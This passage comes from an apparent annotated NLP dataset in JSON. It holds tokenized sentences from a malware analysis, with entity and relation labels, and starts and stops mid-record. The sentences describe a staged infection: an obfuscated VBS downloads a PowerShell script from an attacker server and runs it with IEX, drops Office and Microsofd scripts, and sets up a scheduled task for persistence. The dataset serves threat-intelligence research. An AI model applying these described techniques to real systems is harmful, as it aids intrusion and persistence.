) cmdlet", "pos": [16, 20], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [105, 105], "name": "scripts", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [140, 140], "name": "script", "pos": [3, 4], "index": "14_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [147, 147], "name": "directory", "pos": [10, 11], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [168, 168], "name": "script", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [172, 172], "name": "additional scripts", "pos": [5, 7], "index": "17_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "EX", "evidence": [2], "t": 6, "h": 7}, {"r": "ST", "evidence": [2], "h": 7, "t": 8}, {"r": "RF", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "IJ", "evidence": [2, 3], "h": 7, "t": 11}, {"r": "FR", "evidence": [3], "t": 10, "h": 11}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "FR", "evidence": [4, 5], "h": 12, "t": 14}, {"r": "EX", "evidence": [4, 5], "t": 13, "h": 14}, {"r": "RD", "evidence": [5], "h": 14, "t": 15}, {"r": "CO", "evidence": [5, 6], "h": 14, "t": 16}, {"r": "WR", "evidence": [6], "h": 16, "t": 17}]}, {"title": "068-3", "sents": [["(", "VBS|ISO", ")", "$", "Stage", "1", "ExecutionThe", "VBS", "contains", "junk", "data", "and", "uses", "string", "replacement", "to", "attempt", "to", "obfuscate", "the", "executed", "code", "."], ["Once", "deobfuscated", ",", "the", "VBS", "execution", "is", "straightforward", ":", "It", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "."], ["Stage", "2", "retrievalAs", "expected", ",", "the", "retrieved", "content", "is", "a", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "and", "executed", "to", "continue", "the", "infection", "process", "."], ["It", "is", "mainly", "responsible", "for", "creating", "a", "series", "of", "scripts", "that", "are", "executed", "and", "carry", "out", "various", "tasks", "needed", "for", "the", "malware", "to", "function.Across", "various", "samples", "analyzed", ",", "the", "directory", "locations", "and", "file", "names", "vary", ",", "but", "are", "functionally", "equivalent", "."], ["First", ",", "the", "script", "checks", "for", "the", "existence", "of", "a", "directory", "at", "the", "following", "location", ":", "C", ":", "\\ProgramData\\Facebook\\System32\\Microsoft\\SystemDataIf", "it", "does", "n't", "already", "exist", ",", "the", "directory", "is", "created", "."], ["The", "script", "then", "creates", "several", "additional", "scripts", ",", "writing", "content", "into", "each", "of", "them", "using", "a", "format", "similar", "to", "the", "following", "example", "."], ["The", "following", "files", "are", "created", "in", "this", "manner", ":", "Office.batOffice.vbsOffice.ps1Microsofd.batMicrosofd.vbsMicrosofd.ps1All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "``", "Office.vbs", "''", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "VBS", "pos": [7, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "junk data", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "VBS", "pos": [4, 5], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "It", "pos": [9, 10], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "attacker-controlled server", "pos": [18, 20], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [50, 50], "name": "retrieved content", "pos": [6, 8], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [54, 54], "name": "PowerShell script", "pos": [10, 12], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [60, 60], "name": "( IEX ) cmdlet", "pos": [16, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [72, 72], "name": "It", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "scripts", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "script", "pos": [3, 4], "index": "10_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [123, 123], "name": "directory", "pos": [10, 11], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [144, 144], "name": "script", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [148, 148], "name": "additional scripts", "pos": [5, 7], "index": "13_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [192, 192], "name": "PowerShell", "pos": [5, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": "Office.vbs", "pos": [8, 9], "index": "15_0"}]], "labels": [{"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "IJ", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "FR", "evidence": [2], "t": 6, "h": 7}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "EX", "evidence": [3, 4], "t": 9, "h": 10}, {"r": "RD", "evidence": [4], "h": 10, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "CO", "evidence": [5, 6, 7], "h": 13, "t": 15}, {"r": "EX", "evidence": [7], "h": 14, "t": 15}]}, {"title": "068-4", "sents": [["Once", "deobfuscated", ",", "the", "VBS", "execution", "is", "straightforward", ":", "It", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "."], ["Stage", "2", "retrievalAs", "expected", ",", "the", "retrieved", "content", "is", "a", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "and", "executed", "to", "continue", "the", "infection", "process", "."], ["It", "is", "mainly", "responsible", "for", "creating", "a", "series", "of", "scripts", "that", "are", "executed", "and", "carry", "out", "various", "tasks", "needed", "for", "the", "malware", "to", "function.Across", "various", "samples", "analyzed", ",", "the", "directory", "locations", "and", "file", "names", "vary", ",", "but", "are", "functionally", "equivalent", "."], ["First", ",", "the", "script", "checks", "for", "the", "existence", "of", "a", "directory", "at", "the", "following", "location", ":", "C", ":", "\\ProgramData\\Facebook\\System32\\Microsoft\\SystemDataIf", "it", "does", "n't", "already", "exist", ",", "the", "directory", "is", "created", "."], ["The", "script", "then", "creates", "several", "additional", "scripts", ",", "writing", "content", "into", "each", "of", "them", "using", "a", "format", "similar", "to", "the", "following", "example", "."], ["The", "following", "files", "are", "created", "in", "this", "manner", ":", "Office.batOffice.vbsOffice.ps1Microsofd.batMicrosofd.vbsMicrosofd.ps1All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "``", "Office.vbs", "''", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["The", "first", "script", ",", "``", "Office.vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", "and", "invokes", "WScript", "to", "execute", "a", "batch", "file", "called", "``", "Office.bat", "''", "to", "continue", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "VBS", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "It", "pos": [9, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [18, 18], "name": "attacker-controlled server", "pos": [18, 20], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [27, 27], "name": "retrieved content", "pos": [6, 8], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [31, 31], "name": "PowerShell script", "pos": [10, 12], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [37, 37], "name": "( IEX ) cmdlet", "pos": [16, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "It", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [58, 58], "name": "scripts", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [93, 93], "name": "script", "pos": [3, 4], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [100, 100], "name": "directory", "pos": [10, 11], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [121, 121], "name": "script", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [125, 125], "name": "additional scripts", "pos": [5, 7], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [169, 169], "name": "PowerShell", "pos": [5, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [172, 172], "name": "Office.vbs", "pos": [8, 9], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [189, 189], "name": "Office.vbs", "pos": [5, 6], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [198, 198], "name": "PowerShell", "pos": [14, 15], "index": "15_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [201, 201], "name": "WScript", "pos": [17, 18], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [209, 209], "name": "Office.bat", "pos": [25, 26], "index": "17_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "IJ", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "FR", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "EX", "evidence": [2, 3], "t": 7, "h": 8}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "WR", "evidence": [4], "h": 10, "t": 11}, {"r": "CO", "evidence": [4, 5, 6], "h": 11, "t": 13}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 11, "t": 17}, {"r": "EX", "evidence": [6], "h": 12, "t": 13}, {"r": "WR", "evidence": [6, 7], "h": 12, "t": 14}, {"r": "FR", "evidence": [6, 7], "h": 12, "t": 16}, {"r": "FR", "evidence": [7], "t": 15, "h": 16}, {"r": "WR", "evidence": [7], "t": 14, "h": 15}, {"r": "EX", "evidence": [7], "h": 15, "t": 17}]}, {"title": "068-5", "sents": [["Stage", "2", "retrievalAs", "expected", ",", "the", "retrieved", "content", "is", "a", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "and", "executed", "to", "continue", "the", "infection", "process", "."], ["It", "is", "mainly", "responsible", "for", "creating", "a", "series", "of", "scripts", "that", "are", "executed", "and", "carry", "out", "various", "tasks", "needed", "for", "the", "malware", "to", "function.Across", "various", "samples", "analyzed", ",", "the", "directory", "locations", "and", "file", "names", "vary", ",", "but", "are", "functionally", "equivalent", "."], ["First", ",", "the", "script", "checks", "for", "the", "existence", "of", "a", "directory", "at", "the", "following", "location", ":", "C", ":", "\\ProgramData\\Facebook\\System32\\Microsoft\\SystemDataIf", "it", "does", "n't", "already", "exist", ",", "the", "directory", "is", "created", "."], ["The", "script", "then", "creates", "several", "additional", "scripts", ",", "writing", "content", "into", "each", "of", "them", "using", "a", "format", "similar", "to", "the", "following", "example", "."], ["The", "following", "files", "are", "created", "in", "this", "manner", ":", "Office.batOffice.vbsOffice.ps1Microsofd.batMicrosofd.vbsMicrosofd.ps1All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "``", "Office.vbs", "''", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["The", "first", "script", ",", "``", "Office.vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", "and", "invokes", "WScript", "to", "execute", "a", "batch", "file", "called", "``", "Office.bat", "''", "to", "continue", "the", "infection", "process", "."], ["WScript", "batch", "file", "execution", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [6, 6], "name": "retrieved content", "pos": [6, 8], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [10, 10], "name": "PowerShell script", "pos": [10, 12], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [16, 16], "name": "( IEX ) cmdlet", "pos": [16, 20], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "It", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "scripts", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "script", "pos": [3, 4], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [79, 79], "name": "directory", "pos": [10, 11], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [100, 100], "name": "script", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "additional scripts", "pos": [5, 7], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [148, 148], "name": "PowerShell", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [151, 151], "name": "Office.vbs", "pos": [8, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "Office.vbs", "pos": [5, 6], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [177, 177], "name": "PowerShell", "pos": [14, 15], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [180, 180], "name": "WScript", "pos": [17, 18], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [188, 188], "name": "Office.bat", "pos": [25, 26], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [196, 196], "name": "WScript", "pos": [0, 1], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "EX", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 10}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 8, "t": 14}, {"r": "EX", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "FR", "evidence": [5, 6], "h": 9, "t": 13}, {"r": "FR", "evidence": [6], "t": 12, "h": 13}, {"r": "WR", "evidence": [6], "t": 11, "h": 12}, {"r": "EX", "evidence": [6], "h": 12, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 13, "t": 15}]}, {"title": "068-6", "sents": [["It", "is", "mainly", "responsible", "for", "creating", "a", "series", "of", "scripts", "that", "are", "executed", "and", "carry", "out", "various", "tasks", "needed", "for", "the", "malware", "to", "function.Across", "various", "samples", "analyzed", ",", "the", "directory", "locations", "and", "file", "names", "vary", ",", "but", "are", "functionally", "equivalent", "."], ["First", ",", "the", "script", "checks", "for", "the", "existence", "of", "a", "directory", "at", "the", "following", "location", ":", "C", ":", "\\ProgramData\\Facebook\\System32\\Microsoft\\SystemDataIf", "it", "does", "n't", "already", "exist", ",", "the", "directory", "is", "created", "."], ["The", "script", "then", "creates", "several", "additional", "scripts", ",", "writing", "content", "into", "each", "of", "them", "using", "a", "format", "similar", "to", "the", "following", "example", "."], ["The", "following", "files", "are", "created", "in", "this", "manner", ":", "Office.batOffice.vbsOffice.ps1Microsofd.batMicrosofd.vbsMicrosofd.ps1All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "``", "Office.vbs", "''", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["The", "first", "script", ",", "``", "Office.vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", "and", "invokes", "WScript", "to", "execute", "a", "batch", "file", "called", "``", "Office.bat", "''", "to", "continue", "the", "infection", "process", "."], ["WScript", "batch", "file", "execution", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "scripts", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "script", "pos": [3, 4], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [51, 51], "name": "directory", "pos": [10, 11], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "script", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "additional scripts", "pos": [5, 7], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [120, 120], "name": "PowerShell", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [123, 123], "name": "Office.vbs", "pos": [8, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [140, 140], "name": "Office.vbs", "pos": [5, 6], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [149, 149], "name": "PowerShell", "pos": [14, 15], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [152, 152], "name": "WScript", "pos": [17, 18], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [160, 160], "name": "Office.bat", "pos": [25, 26], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [168, 168], "name": "WScript", "pos": [0, 1], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [182, 182], "name": "PowerShell", "pos": [9, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [185, 185], "name": "'Office.ps1", "pos": [12, 13], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 5, "t": 11}, {"r": "EX", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "FR", "evidence": [4, 5], "h": 6, "t": 10}, {"r": "FR", "evidence": [5], "t": 9, "h": 10}, {"r": "WR", "evidence": [5], "t": 8, "h": 9}, {"r": "EX", "evidence": [5], "h": 9, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "FR", "evidence": [6, 7], "h": 12, "t": 13}, {"r": "EX", "evidence": [7], "h": 13, "t": 14}]}, {"title": "068-7", "sents": [["First", ",", "the", "script", "checks", "for", "the", "existence", "of", "a", "directory", "at", "the", "following", "location", ":", "C", ":", "\\ProgramData\\Facebook\\System32\\Microsoft\\SystemDataIf", "it", "does", "n't", "already", "exist", ",", "the", "directory", "is", "created", "."], ["The", "script", "then", "creates", "several", "additional", "scripts", ",", "writing", "content", "into", "each", "of", "them", "using", "a", "format", "similar", "to", "the", "following", "example", "."], ["The", "following", "files", "are", "created", "in", "this", "manner", ":", "Office.batOffice.vbsOffice.ps1Microsofd.batMicrosofd.vbsMicrosofd.ps1All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "``", "Office.vbs", "''", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["The", "first", "script", ",", "``", "Office.vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", "and", "invokes", "WScript", "to", "execute", "a", "batch", "file", "called", "``", "Office.bat", "''", "to", "continue", "the", "infection", "process", "."], ["WScript", "batch", "file", "execution", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["PowerShell", "script", "execution", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "script", "pos": [3, 4], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [10, 10], "name": "directory", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "script", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "additional scripts", "pos": [5, 7], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [79, 79], "name": "PowerShell", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "Office.vbs", "pos": [8, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [99, 99], "name": "Office.vbs", "pos": [5, 6], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [108, 108], "name": "PowerShell", "pos": [14, 15], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [111, 111], "name": "WScript", "pos": [17, 18], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [119, 119], "name": "Office.bat", "pos": [25, 26], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [127, 127], "name": "WScript", "pos": [0, 1], "index": "10_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [141, 141], "name": "PowerShell", "pos": [9, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [144, 144], "name": "'Office.ps1", "pos": [12, 13], "index": "12_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 3, "t": 9}, {"r": "EX", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "FR", "evidence": [3, 4], "h": 4, "t": 8}, {"r": "FR", "evidence": [4], "t": 7, "h": 8}, {"r": "WR", "evidence": [4], "t": 6, "h": 7}, {"r": "EX", "evidence": [4], "h": 7, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "FR", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "EX", "evidence": [6], "h": 11, "t": 12}]}, {"title": "068-8", "sents": [["The", "script", "then", "creates", "several", "additional", "scripts", ",", "writing", "content", "into", "each", "of", "them", "using", "a", "format", "similar", "to", "the", "following", "example", "."], ["The", "following", "files", "are", "created", "in", "this", "manner", ":", "Office.batOffice.vbsOffice.ps1Microsofd.batMicrosofd.vbsMicrosofd.ps1All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "``", "Office.vbs", "''", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["The", "first", "script", ",", "``", "Office.vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", "and", "invokes", "WScript", "to", "execute", "a", "batch", "file", "called", "``", "Office.bat", "''", "to", "continue", "the", "infection", "process", "."], ["WScript", "batch", "file", "execution", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["PowerShell", "script", "execution", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", ",", "as", "shown", "below", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "script", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "additional scripts", "pos": [5, 7], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [49, 49], "name": "PowerShell", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "Office.vbs", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "Office.vbs", "pos": [5, 6], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [78, 78], "name": "PowerShell", "pos": [14, 15], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [81, 81], "name": "WScript", "pos": [17, 18], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [89, 89], "name": "Office.bat", "pos": [25, 26], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [97, 97], "name": "WScript", "pos": [0, 1], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [111, 111], "name": "PowerShell", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [114, 114], "name": "'Office.ps1", "pos": [12, 13], "index": "10_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [123, 123], "name": "PowerShell", "pos": [2, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [137, 137], "name": "Office", "pos": [16, 17], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 7}, {"r": "EX", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "FR", "evidence": [2, 3], "h": 2, "t": 6}, {"r": "FR", "evidence": [3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3], "t": 4, "h": 5}, {"r": "EX", "evidence": [3], "h": 5, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "FR", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "EX", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 11}, {"r": "WR", "evidence": [7], "h": 11, "t": 12}]}, {"title": "068-9", "sents": [["The", "following", "files", "are", "created", "in", "this", "manner", ":", "Office.batOffice.vbsOffice.ps1Microsofd.batMicrosofd.vbsMicrosofd.ps1All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "``", "Office.vbs", "''", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["The", "first", "script", ",", "``", "Office.vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", "and", "invokes", "WScript", "to", "execute", "a", "batch", "file", "called", "``", "Office.bat", "''", "to", "continue", "the", "infection", "process", "."], ["WScript", "batch", "file", "execution", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["PowerShell", "script", "execution", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", ",", "as", "shown", "below", "."], ["This", "scheduled", "task", "then", "executes", "``", "Microsofd.vbs", "''", "as", "part", "of", "the", "creation", "process", "."]], "vertexSet": [[{"type": "TP", "sent_id": 1, "global_pos": [26, 26], "name": "PowerShell", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "Office.vbs", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "Office.vbs", "pos": [5, 6], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [55, 55], "name": "PowerShell", "pos": [14, 15], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [58, 58], "name": "WScript", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "Office.bat", "pos": [25, 26], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [74, 74], "name": "WScript", "pos": [0, 1], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [88, 88], "name": 